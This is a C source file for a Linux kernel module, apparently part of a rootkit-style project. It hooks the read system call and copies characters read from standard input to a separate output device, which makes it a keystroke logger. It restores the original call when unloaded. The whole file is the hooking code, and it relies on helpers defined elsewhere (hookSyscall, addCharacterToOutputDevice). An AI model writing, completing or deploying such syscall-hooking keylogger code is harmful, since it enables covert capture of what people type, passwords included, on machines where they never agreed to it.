//TODO: stop including these everywhere..
#include <linux/module.h>   // For modules
#include <linux/kernel.h>   // For KERN_INFO
#include <linux/init.h>     // For init macros
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>

#include "common.h"
#include "logInput.h"
#include "outputDevice.h"

struct page *syscallPageTemp;

asmlinkage int (*originalRead)(int, void*, size_t);

asmlinkage int readHook(int fd, void* buf, size_t nbytes)
{
	int result;
	result = (*originalRead)(fd, buf, nbytes);
	if (fd==0)
	{	
		
	//printk("\n");
	//printk ("%c\n", (((char *) buf)[0]));
		
		{
			char *bufferAsCharacterAnArray = (char *) buf;
			char ch = bufferAsCharacterAnArray[0];
			addCharacterToOutputDevice(ch);
		}
		//printk("stdin read\n");
	//printk("bytes read = %d\n", (int) nbytes);
	}
	return result;
} 


int __init logInput_init(void) {	
	originalRead = hookSyscall(__NR_read, readHook);
	printk(KERN_INFO "original read is at %p\n", originalRead);
	return 0;
}

void __exit logInput_exit(void) {
	printk(KERN_INFO "restoring original read call to %p\n", originalRead);
	hookSyscall(__NR_read, originalRead);
}
